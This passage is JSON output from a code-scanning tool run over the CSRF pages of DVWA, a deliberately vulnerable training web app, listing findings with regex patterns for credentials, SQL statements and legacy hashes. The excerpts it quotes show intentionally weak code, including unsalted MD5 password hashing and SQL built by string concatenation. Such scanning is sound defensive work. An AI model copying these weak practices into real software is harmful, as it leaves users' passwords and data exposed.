        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 37,
        "startLocationColumn": 18,
        "endLocationLine": 37,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;\n\t}\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n",
        "startLocationLine": 41,
        "startLocationColumn": 18,
        "endLocationLine": 41,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;\n\t}\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n",
        "startLocationLine": 41,
        "startLocationColumn": 53,
        "endLocationLine": 41,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 32,
        "endLocationLine": 18,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 77,
        "endLocationLine": 18,
        "endLocationColumn": 85
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 90,
        "endLocationLine": 18,
        "endLocationColumn": 98
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n\tif( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {\n\t\t// It does!\n",
        "startLocationLine": 20,
        "startLocationColumn": 22,
        "endLocationLine": 20,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 43,
        "endLocationLine": 31,
        "endLocationColumn": 51
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 56,
        "endLocationLine": 31,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 32,
        "startLocationColumn": 23,
        "endLocationLine": 32,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 37,
        "startLocationColumn": 18,
        "endLocationLine": 37,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;\n\t}\n}\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n",
        "startLocationLine": 41,
        "startLocationColumn": 53,
        "endLocationLine": 41,
        "endLocationColumn": 61
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );",
        "excerpt": "\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\n\t// Do both new passwords match and does the current password match the user?\n",
        "startLocationLine": 18,
        "startLocationColumn": 24,
        "endLocationLine": 18,
        "endLocationColumn": 113
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n\n\t\t// Feedback for the user\n",
        "startLocationLine": 31,
        "startLocationColumn": 25,
        "endLocationLine": 31,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Sanitise current password input\n\t$pass_curr = stripslashes( $pass_curr );\n\t$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass_curr = md5( $pass_curr );\n\n\t// Check that the current password is correct\n\t$data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );\n",
        "startLocationLine": 15,
        "startLocationColumn": 15,
        "endLocationLine": 15,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t// It does!\n\t\t$pass_new = stripslashes( $pass_new );\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database with new password\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );\n\t\t$data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );\n",
        "startLocationLine": 28,
        "startLocationColumn": 15,
        "endLocationLine": 28,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 17,
        "startLocationColumn": 34,
        "endLocationLine": 17,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n\t\telse {\n\t\t\t// Issue with passwords matching\n\t\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 21,
        "startLocationColumn": 19,
        "endLocationLine": 21,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Issue with passwords matching\n\t\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t}\n\t}\n\telse {\n\t\t// Didn&#39;t come from a trusted source\n\t\t$html .= &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;\n",
        "startLocationLine": 25,
        "startLocationColumn": 19,
        "endLocationLine": 25,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 17,
        "startLocationColumn": 34,
        "endLocationLine": 17,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n\t\telse {\n\t\t\t// Issue with passwords matching\n\t\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 21,
        "startLocationColumn": 19,
        "endLocationLine": 21,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 17,
        "startLocationColumn": 14,
        "endLocationLine": 17,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\tif( $pass_new == $pass_conf ) {\n\t\t\t// They do!\n\t\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 14,
        "startLocationColumn": 16,
        "endLocationLine": 14,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 15,
        "startLocationColumn": 33,
        "endLocationLine": 15,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 19,
        "startLocationColumn": 18,
        "endLocationLine": 19,
        "endLocationColumn": 26
      },
      {
